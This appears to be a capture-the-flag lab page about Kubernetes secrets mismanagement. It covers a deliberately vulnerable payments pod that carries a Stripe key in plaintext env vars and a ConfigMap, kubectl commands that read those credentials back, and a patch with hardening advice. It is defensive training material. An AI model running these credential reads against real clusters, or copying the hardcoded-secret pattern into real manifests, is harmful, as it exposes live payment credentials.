# K03 — Secrets Management Failures · NimbusMart CTF

**Difficulty:** Easy · **100 pts** · **Flag:** `FLAG{...}`

## Briefing
You have `get pod` rights in NimbusMart's `checkout` namespace. The billing
team shipped the `payments-api` in a hurry and pasted the live Stripe secret
key straight into the pod spec as a plaintext env var. Anything in a pod's
`env` values is readable by anyone who can read the pod — no exec, no RCE, no
exploit chain required.

**Objective:** recover the hardcoded Stripe key from `checkout/payments-api`.

## Capture the flag
```bash
# Deploy the vulnerable payments-api
kubectl apply -f vulnerable.yaml

# The key is sitting in plain sight in the pod spec
kubectl get pod -n checkout -o yaml | grep -i stripe

# Or dump it straight out of the container environment
kubectl exec -n checkout deploy/payments-api -- env | grep STRIPE
#  -> STRIPE_SECRET_KEY=FLAG{hardcoded_stripe_key_sk_live_nimbus}
```

The ConfigMap leaks a second credential the same way — ConfigMaps are not secret:
```bash
kubectl get configmap payments-config -n checkout -o jsonpath='{.data.BILLING_WEBHOOK_TOKEN}'; echo
```

## Patch & verify
```bash
kubectl delete -f vulnerable.yaml
kubectl apply -f fixed.yaml

# The env no longer carries the key — it's a read-only file now
kubectl exec -n checkout deploy/payments-api -- env | grep STRIPE || echo NO_SECRET_IN_ENV
kubectl exec -n checkout deploy/payments-api -- cat /etc/secrets/STRIPE_SECRET_KEY; echo

# Prove it with the checker
cd ../../checker && go run . --check k03 -n checkout
```

A real-world fix goes further than this manifest: enable encryption-at-rest for
etcd (KMS-backed, e.g. AWS KMS on EKS) and source the key from an external
secret manager (AWS Secrets Manager, Vault, External Secrets Operator) so it is
never committed to Git in the first place.

## Cleanup
```bash
kubectl delete -f vulnerable.yaml --ignore-not-found
kubectl delete -f fixed.yaml --ignore-not-found
```
